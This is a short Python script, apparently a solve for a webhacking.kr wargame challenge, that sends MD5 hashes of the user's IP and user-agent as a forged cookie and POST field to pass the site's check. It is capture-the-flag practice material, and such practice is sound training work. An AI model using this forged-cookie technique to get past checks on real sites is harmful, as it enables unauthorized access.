import requests
import hashlib

url = "https://webhacking.kr/challenge/bonus-6/gpcc.php"
address = '자신의 ip'
user_agent = 'python-requests/2.31.0' #자신의 버전이 다를수있습니다.
md5_ip_addr = hashlib.md5(address.encode()).hexdigest()
md5_agent_addr = hashlib.md5(user_agent.encode()).hexdigest()

cookie = { 'test' : md5_ip_addr }
data = { 'kk' : md5_agent_addr }

response = requests.post(url, cookies=cookie, data=data)

print(response.text)